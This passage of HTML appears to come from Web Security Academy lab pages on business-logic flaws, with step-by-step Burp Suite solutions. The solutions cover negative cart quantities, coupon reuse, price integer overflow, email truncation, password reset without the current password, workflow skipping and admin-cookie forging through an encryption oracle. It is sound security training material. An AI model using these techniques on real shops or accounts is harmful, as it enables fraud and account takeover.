                            <ol>
                                <li>
                                    With Burp running, log in and add a cheap item to your cart.
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and study the corresponding HTTP
                                    messages. Notice that the quantity is determined by a parameter in the
                                    <code>
        POST /cart
       </code>
                                    request.
                                </li>
                                <li>
                                    Go to the "Intercept" tab and turn on interception. Add another item to your cart
                                    and go to the intercepted
                                    <code>
        POST /cart
       </code>
                                    request in Burp.
                                </li>
                                <li>
                                    Change the
                                    <code>
        quantity
       </code>
                                    parameter to an arbitrary integer, then forward any remaining requests. Observe that
                                    the quantity in the cart was successfully updated based on your input.
                                </li>
                                <li>
                                    Repeat this process, but request a negative quantity this time. Check that this is
                                    successfully deducted from the cart quantity.
                                </li>
                                <li>
                                    Request a suitable negative quantity to remove more units from the cart than it
                                    currently contains. Confirm that you have successfully forced the cart to contain a
                                    negative quantity of the product. Go to your cart and notice that the total price is
                                    now also a negative amount.
                                </li>
                                <li>
                                    Add the leather jacket to your cart as normal. Add a suitable negative quantity of
                                    the another item to reduce the total price to less than your remaining store credit.
                                </li>
                                <li>
                                    Place the order to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Inconsistent security controls
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab's flawed logic allows arbitrary users to access administrative functionality that should only
                be available to company employees. To solve the lab, access the admin panel and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/07b14e865f15e49f0856ab8db29ab190045abf578eff9ee7a794692eb305a391?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-inconsistent-security-controls"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open the lab then go to the "Target" &gt; "Site map" tab in Burp. Right-click on the
                                    lab domain and select "Engagement tools" &gt; "Discover content" to open the content
                                    discovery tool.
                                </li>
                                <li>
                                    Click "Session is not running" to start the content discovery. After a short while,
                                    look at the "Site map" tab in the dialog. Notice that it discovered the path
                                    <code>
        /admin
       </code>
                                    .
                                </li>
                                <li>
                                    Try and browse to
                                    <code>
        /admin
       </code>
                                    . Although you don't have access, the error message indicates that
                                    <code>
        DontWannaCry
       </code>
                                    users do.
                                </li>
                                <li>
                                    <p>
                                        Go to the account registration page. Notice the message telling
                                        <code>
         DontWannaCry
        </code>
                                        employees to use their company email address. Register with an arbitrary email
                                        address in the format:
                                    </p>
                                    <code class="code-scrollable">
        anything@your-email-id.web-security-academy.net
       </code>
                                    <p>
                                        You can find your email domain name by clicking the "Email client" button.
                                    </p>
                                </li>
                                <li>
                                    Go to the email client and click the link in the confirmation email to complete the
                                    registration.
                                </li>
                                <li>
                                    Log in using your new account and go to the "My account" page. Notice that you have
                                    the option to change your email address. Change your email address to an arbitrary
                                    <code>
        @dontwannacry.com
       </code>
                                    address.
                                </li>
                                <li>
                                    Notice that you now have access to the admin panel, where you can delete
                                    <code>
        carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Flawed enforcement of business rules
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a
                "Lightweight l33t leather jacket".
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ce7411a23ddad977fdc192a1a252b8737d674481920a71bc5fd307bb5a53aa77?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-flawed-enforcement-of-business-rules"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and notice that there is a coupon code,
                                    <code>
        NEWCUST5
       </code>
                                    .
                                </li>
                                <li>
                                    At the bottom of the page, sign up to the newsletter. You receive another coupon
                                    code,
                                    <code>
        SIGNUP30
       </code>
                                    .
                                </li>
                                <li>
                                    Add the leather jacket to your cart.
                                </li>
                                <li>
                                    Go to the checkout and apply both of the coupon codes to get a discount on your
                                    order.
                                </li>
                                <li>
                                    Try applying the codes more than once. Notice that if you enter the same code twice
                                    in a row, it is rejected because the coupon has already been applied. However, if
                                    you alternate between the two codes, you can bypass this control.
                                </li>
                                <li>
                                    Reuse the two codes enough times to reduce your order total to less than your
                                    remaining store credit. Complete the order to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Low-level logic flaw
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow
                to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You will need to use Burp Intruder (or Turbo Intruder) to solve this lab.
                            </p>
                            <p>
                                To make sure the price increases in predictable increments, we recommend configuring
                                your attack to only send one request at a time. In Burp Intruder, you can do this from
                                the resource pool settings using the
                                <strong>
                                    Maximum concurrent requests
                                </strong>
                                option.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/7d3ebe9916b96a36642a8bd0179888fbcddef63a401c684a077d9877a0966aa4?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-low-level"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, log in and attempt to buy the leather jacket. The order is
                                    rejected because you don't have enough store credit. In the proxy history, study the
                                    order process. Send the
                                    <code>
        POST /cart
       </code>
                                    request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, notice that you can only add a 2-digit quantity with each request.
                                    Send the request to Burp Intruder.
                                </li>
                                <li>
                                    Go to Burp Intruder. On the "Positions" tab, set the
                                    <code>
        quantity
       </code>
                                    parameter to
                                    <code>
        99
       </code>
                                    .
                                </li>
                                <li>
                                    On the "Payloads" tab, select the payload type "Null payloads". Under "Payload
                                    settings", select "Continue indefinitely". Start the attack.
                                </li>
                                <li>
                                    While the attack is running, go to your cart. Keep refreshing the page every so
                                    often and monitor the total price. Eventually, notice that the price suddenly
                                    switches to a large negative integer and starts counting up towards 0. The price has
                                    exceeded the maximum value permitted for an integer in the back-end programming
                                    language (2,147,483,647). As a result, the value has looped back around to the
                                    minimum possible value (-2,147,483,648).
                                </li>
                                <li>
                                    Clear your cart. In the next few steps, we'll try to add enough units so that the
                                    price loops back around and settles between $0 and the $100 of your remaining store
                                    credit. This is not mathematically possible using only the leather jacket. Note that
                                    the price of the jacket is stored in cents (133700).
                                </li>
                                <li>
                                    Create the same Intruder attack again, but this time, under "Payloads" &gt; "Payload
                                    settings", choose to generate exactly
                                    <code>
        323
       </code>
                                    payloads.
                                </li>
                                <li>
                                    Go to the "Resource pool" tab and add the attack to a resource pool with the
                                    "Maximum concurrent requests" set to
                                    <code>
        1
       </code>
                                    . Start the attack.
                                </li>
                                <li>
                                    When the Intruder attack finishes, go to the
                                    <code>
        POST /cart
       </code>
                                    request in Burp Repeater and send a single request for
                                    <code>
        47
       </code>
                                    jackets. The total price of the order should now be
                                    <code>
        -$1221.96
       </code>
                                    .
                                </li>
                                <li>
                                    Use Burp Repeater to add a suitable quantity of another item to your cart so that
                                    the total falls between $0 and $100.
                                </li>
                                <li>
                                    Place the order to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Inconsistent handling of exceptional input
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab doesn't adequately validate user input. You can exploit a logic flaw in its account
                registration process to gain access to administrative functionality. To solve the lab, access the admin
                panel and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can use the link in the lab banner to access an email client connected to your own
                                private mail server. The client will display all messages sent to
                                <code>
       @YOUR-EMAIL-ID.web-security-academy.net
      </code>
                                and any arbitrary subdomains. Your unique email ID is displayed in the email client.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/2cfddd3fae848e161277e28cc5cc7782f2b4baa2cbefbd2a3dce178fe656ad17?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-inconsistent-handling-of-exceptional-input"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, open the lab and go to the "Target" &gt; "Site
                                    map" tab. Right-click on the lab domain and select "Engagement tools" &gt; "Discover
                                    content" to open the content discovery tool.
                                </li>
                                <li>
                                    Click "Session is not running" to start the content discovery. After a short while,
                                    look at the "Site map" tab in the dialog. Notice that it discovered the path
                                    <code>
        /admin
       </code>
                                    .
                                </li>
                                <li>
                                    Try to browse to
                                    <code>
        /admin
       </code>
                                    . Although you don't have access, an error message indicates that
                                    <code>
        DontWannaCry
       </code>
                                    users do.
                                </li>
                                <li>
                                    Go to the account registration page. Notice the message telling
                                    <code>
        DontWannaCry
       </code>
                                    employees to use their company email address.
                                </li>
                                <li>
                                    From the button in the lab banner, open the email client. Make a note of the unique
                                    ID in the domain name for your email server (
                                    <code>
        @YOUR-EMAIL-ID.web-security-academy.net
       </code>
                                    ).
                                </li>
                                <li>
                                    <p>
                                        Go back to the lab and register with an exceptionally long email address in the
                                        format:
                                    </p>
                                    <code class="code-scrollable">
        very-long-string@YOUR-EMAIL-ID.web-security-academy.net
       </code>
                                    <p>
                                        The
                                        <code>
         very-long-string
        </code>
                                        should be at least 200 characters long.
                                    </p>
                                </li>
                                <li>
                                    Go to the email client and notice that you have received a confirmation email. Click
                                    the link to complete the registration process.
                                </li>
                                <li>
                                    Log in and go to the "My account" page. Notice that your email address has been
                                    truncated to 255 characters.
                                </li>
                                <li>
                                    Log out and go back to the account registration page.
                                </li>
                                <li>
                                    <p>
                                        Register a new account with another long email address, but this time include
                                        <code>
         dontwannacry.com
        </code>
                                        as a subdomain in your email address as follows:
                                    </p>
                                    <code class="code-scrollable">
        very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net
       </code>
                                    <p>
                                        Make sure that the
                                        <code>
         very-long-string
        </code>
                                        is the right number of characters so that the "
                                        <code>
         m
        </code>
                                        " at the end of
                                        <code>
         @dontwannacry.com
        </code>
                                        is character 255 exactly.
                                    </p>
                                </li>
                                <li>
                                    Go to the email client and click the link in the confirmation email that you have
                                    received. Log in to your new account and notice that you now have access to the
                                    admin panel. The confirmation email was successfully sent to your email client, but
                                    the application server truncated the address associated with your account to 255
                                    characters. As a result, you have been able to register with what appears to be a
                                    valid
                                    <code>
        @dontwannacry.com
       </code>
                                    address. You can confirm this from the "My account" page.
                                </li>
                                <li>
                                    Go to the admin panel and delete
                                    <code>
        carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Weak isolation on dual-use endpoint
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab makes a flawed assumption about the user's privilege level based on their input. As a result,
                you can exploit the logic of its account management features to gain access to arbitrary users'
                accounts. To solve the lab, access the
                <code>
   administrator
  </code>
                account and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/05a619f04b486230a3144985ade21e739b2d88052bb72e902cd033c906b991e3?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-weak-isolation-on-dual-use-endpoint"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, log in and access your account page.
                                </li>
                                <li>
                                    Change your password.
                                </li>
                                <li>
                                    Study the
                                    <code>
        POST /my-account/change-password
       </code>
                                    request in Burp Repeater.
                                </li>
                                <li>
                                    Notice that if you remove the
                                    <code>
        current-password
       </code>
                                    parameter entirely, you are able to successfully change your password without
                                    providing your current one.
                                </li>
                                <li>
                                    Observe that the user whose password is changed is determined by the
                                    <code>
        username
       </code>
                                    parameter. Set
                                    <code>
        username=administrator
       </code>
                                    and send the request again.
                                </li>
                                <li>
                                    Log out and notice that you can now successfully log in as the
                                    <code>
        administrator
       </code>
                                    using the password you just set.
                                </li>
                                <li>
                                    Go to the admin panel and delete
                                    <code>
        carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Insufficient workflow validation
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the
                lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/b20989c23ae664ef4d1f4d060455e20d6c019ae17819049dfad91790a7c55765?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-insufficient-workflow-validation"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, log in and buy any item that you can afford with your store
                                    credit.
                                </li>
                                <li>
                                    Study the proxy history. Observe that when you place an order, the
                                    <code>
        POST /cart/checkout
       </code>
                                    request redirects you to an order confirmation page. Send
                                    <code>
        GET /cart/order-confirmation?order-confirmation=true
       </code>
                                    to Burp Repeater.
                                </li>
                                <li>
                                    Add the leather jacket to your basket.
                                </li>
                                <li>
                                    In Burp Repeater, resend the order confirmation request. Observe that the order is
                                    completed without the cost being deducted from your store credit and the lab is
                                    solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Authentication bypass via flawed state machine
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab,
                exploit this flaw to bypass the lab's authentication, access the admin interface, and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/f009e13156910cf7897bc7ed85b32662e8b2753196347950c3b3c51d86b9c3c5?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-authentication-bypass-via-flawed-state-machine"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, complete the login process and notice that you need to select
                                    your role before you are taken to the home page.
                                </li>
                                <li>
                                    Use the content discovery tool to identify the
                                    <code>
        /admin
       </code>
                                    path.
                                </li>
                                <li>
                                    Try browsing to
                                    <code>
        /admin
       </code>
                                    directly from the role selection page and observe that this doesn't work.
                                </li>
                                <li>
                                    Log out and then go back to the login page. In Burp, turn on proxy intercept then
                                    log in.
                                </li>
                                <li>
                                    Forward the
                                    <code>
        POST /login
       </code>
                                    request. The next request is
                                    <code>
        GET /role-selector
       </code>
                                    . Drop this request and then browse to the lab's home page. Observe that your role
                                    has defaulted to the
                                    <code>
        administrator
       </code>
                                    role and you have access to the admin panel.
                                </li>
                                <li>
                                    Delete
                                    <code>
        carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Infinite money logic flaw
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a
                "Lightweight l33t leather jacket".
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/4481d16f7bd443604bf74cef06da6df4b6da2b010f6f5a6b33358551d560c9d0?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-infinite-money"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                This solution uses Burp Intruder to automate the process of buying and redeeming gift
                                cards. Users proficient in Python might prefer to use the Turbo Intruder extension
                                instead.
                            </p>
                            <ol>
                                <li>
                                    With Burp running, log in and sign up for the newsletter to obtain a coupon code,
                                    <code>
        SIGNUP30
       </code>
                                    . Notice that you can buy $10 gift cards and redeem them from the "My account" page.
                                </li>
                                <li>
                                    Add a gift card to your basket and proceed to the checkout. Apply the coupon code to
                                    get a 30% discount. Complete the order and copy the gift card code to your
                                    clipboard.
                                </li>
                                <li>
                                    Go to your account page and redeem the gift card. Observe that this entire process
                                    has added $3 to your store credit. Now you need to try and automate this process.
                                </li>
                                <li>
                                    Study the proxy history and notice that you redeem your gift card by supplying the
                                    code in the
                                    <code>
        gift-card
       </code>
                                    parameter of the
                                    <code>
        POST /gift-card
       </code>
                                    request.
                                </li>
                                <li>
                                    Go to "Project options" &gt; "Sessions". In the "Session handling rules" panel,
                                    click "Add". The "Session handling rule editor" dialog opens.
                                </li>
                                <li>
                                    In the dialog, go to the "Scope" tab. Under "URL Scope", select "Include all URLs".
                                </li>
                                <li>
                                    Go back to the "Details" tab. Under "Rule actions", click "Add" &gt; "Run a macro".
                                    Under "Select macro", click "Add" again to open the Macro Recorder.
                                </li>
                                <li>
                                    <p>
                                        Select the following sequence of requests:
                                    </p>
                                    <code class="code-scrollable">
        POST /cart
POST /cart/coupon
POST /cart/checkout
GET /cart/order-confirmation?order-confirmed=true
POST /gift-card
       </code>
                                    <p>
                                        Then, click "OK". The Macro Editor opens.
                                    </p>
                                </li>
                                <li>
                                    In the list of requests, select
                                    <code>
        GET /cart/order-confirmation?order-confirmed=true
       </code>
                                    . Click "Configure item". In the dialog that opens, click "Add" to create a custom
                                    parameter. Name the parameter
                                    <code>
        gift-card
       </code>
                                    and highlight the gift card code at the bottom of the response. Click "OK" twice to
                                    go back to the Macro Editor.
                                </li>
                                <li>
                                    Select the
                                    <code>
        POST /gift-card
       </code>
                                    request and click "Configure item" again. In the "Parameter handling" section, use
                                    the drop-down menus to specify that the
                                    <code>
        gift-card
       </code>
                                    parameter should be derived from the prior response (response 4). Click "OK".
                                </li>
                                <li>
                                    In the Macro Editor, click "Test macro". Look at the response to
                                    <code>
        GET /cart/order-confirmation?order-confirmation=true
       </code>
                                    and note the gift card code that was generated. Look at the
                                    <code>
        POST /gift-card
       </code>
                                    request. Make sure that the
                                    <code>
        gift-card
       </code>
                                    parameter matches and confirm that it received a
                                    <code>
        302
       </code>
                                    response. Keep clicking "OK" until you get back to the main Burp window.
                                </li>
                                <li>
                                    Send the
                                    <code>
        GET /my-account
       </code>
                                    request to Burp Intruder. Use the "Sniper" attack type.
                                </li>
                                <li>
                                    On the "Payloads" tab, select the payload type "Null payloads". Under "Payload
                                    settings", choose to generate
                                    <code>
        412
       </code>
                                    payloads.
                                </li>
                                <li>
                                    Go to the "Resource pool" tab and add the attack to a resource pool with the
                                    "Maximum concurrent requests" set to
                                    <code>
        1
       </code>
                                    . Start the attack.
                                </li>
                                <li>
                                    When the attack finishes, you will have enough store credit to buy the jacket and
                                    solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Authentication bypass via encryption oracle
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit
                this flaw to gain access to the admin panel and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/6595c840a41181221c4f4f7c250580d7d9d5f9fa1b3d7aa1c9761ecdd2f33df5?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-authentication-bypass-via-encryption-oracle"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in with the "Stay logged in" option enabled and post a comment. Study the
                                    corresponding requests and responses using Burp's manual testing tools. Observe that
                                    the
                                    <code>
        stay-logged-in
       </code>
                                    cookie is encrypted.
                                </li>
                                <li>
                                    Notice that when you try and submit a comment using an invalid email address, the
                                    response sets an encrypted
                                    <code>
        notification
       </code>
                                    cookie before redirecting you to the blog post.
                                </li>
                                <li>
                                    <p>
                                        Notice that the error message reflects your input from the
                                        <code>
         email
        </code>
                                        parameter in cleartext:
                                    </p>
                                    <code class="code-scrollable">
        Invalid email address: your-invalid-email
       </code>
                                    <p>
                                        Deduce that this must be decrypted from the
                                        <code>
         notification
        </code>
                                        cookie. Send the
                                        <code>
         POST /post/comment
        </code>
                                        and the subsequent
                                        <code>
         GET /post?postId=x
        </code>
                                        request (containing the notification cookie) to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    In Repeater, observe that you can use the
                                    <code>
        email
       </code>
                                    parameter of the
                                    <code>
        POST
       </code>
                                    request to encrypt arbitrary data and reflect the corresponding ciphertext in the
                                    <code>
        Set-Cookie
       </code>
                                    header. Likewise, you can use the
                                    <code>
        notification
       </code>
                                    cookie in the
                                    <code>
        GET
       </code>
                                    request to decrypt arbitrary ciphertext and reflect the output in the error message.
                                    For simplicity, double-click the tab for each request and rename the tabs
                                    <code>
        encrypt
       </code>
                                    and
                                    <code>
        decrypt
       </code>
                                    respectively.
                                </li>
                                <li>
                                    <p>
                                        In the decrypt request, copy your
                                        <code>
         stay-logged-in
        </code>
                                        cookie and paste it into the
                                        <code>
         notification
        </code>
                                        cookie. Send the request. Instead of the error message, the response now
                                        contains the decrypted
                                        <code>
         stay-logged-in
        </code>
                                        cookie, for example:
                                    </p>
                                    <code class="code-scrollable">
        wiener:1598530205184
       </code>
                                    <p>
                                        This reveals that the cookie should be in the format
                                        <code>
         username:timestamp
        </code>
                                        . Copy the timestamp to your clipboard.
                                    </p>
                                </li>
                                <li>
                                    Go to the encrypt request and change the email parameter to
                                    <code>
        administrator:your-timestamp
       </code>
                                    . Send the request and then copy the new
                                    <code>
        notification
       </code>
                                    cookie from the response.
                                </li>
                                <li>
                                    Decrypt this new cookie and observe that the 23-character "
                                    <code>
        Invalid email address:
       </code>
                                    " prefix is automatically added to any value you pass in using the
                                    <code>
        email
       </code>
                                    parameter. Send the
                                    <code>
        notification
       </code>
                                    cookie to Burp Decoder.
                                </li>
                                <li>
                                    In Decoder, URL-decode and Base64-decode the cookie.
                                </li>
                                <li>
                                    In Burp Repeater, switch to the message editor's "Hex" tab. Select the first 23
                                    bytes, then right-click and select "Delete selected bytes".
                                </li>
                                <li>
                                    Re-encode the data and copy the result into the
                                    <code>
        notification
       </code>
                                    cookie of the decrypt request. When you send the request, observe that an error
                                    message indicates that a block-based encryption algorithm is used and that the input
                                    length must be a multiple of 16. You need to pad the "
                                    <code>
        Invalid email address:
       </code>
                                    " prefix with enough bytes so that the number of bytes you will remove is a multiple
                                    of 16.
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, go back to the encrypt request and add 9 characters to the
                                        start of the intended cookie value, for example:
                                    </p>
                                    <code class="code-scrollable">
        xxxxxxxxxadministrator:your-timestamp
       </code>
                                    <p>
                                        Encrypt this input and use the decrypt request to test that it can be
                                        successfully decrypted.
                                    </p>
                                </li>
                                <li>
                                    Send the new ciphertext to Decoder, then URL and Base64-decode it. This time, delete
                                    32 bytes from the start of the data. Re-encode the data and paste it into the
                                    <code>
        notification
       </code>
                                    parameter in the decrypt request. Check the response to confirm that your input was
                                    successfully decrypted and, crucially, no longer contains the "
                                    <code>
        Invalid email address:
       </code>
                                    " prefix. You should only see
                                    <code>
        administrator:your-timestamp
       </code>
                                    .
                                </li>
                                <li>
                                    From the proxy history, send the
                                    <code>
        GET /
       </code>
                                    request to Burp Repeater. Delete the
                                    <code>
        session
       </code>
                                    cookie entirely, and replace the
                                    <code>
        stay-logged-in
       </code>
                                    cookie with the ciphertext of your self-made cookie. Send the request. Observe that
                                    you are now logged in as the administrator and have access to the admin panel.
                                </li>
                                <li>
                                    Using Burp Repeater, browse to
                                    <code>
        /admin
       </code>
                                    and notice the option for deleting users. Browse to
                                    <code>
        /admin/delete?username=carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Basic password reset poisoning
                (host-header)</h1>
            <div class="container-columns">
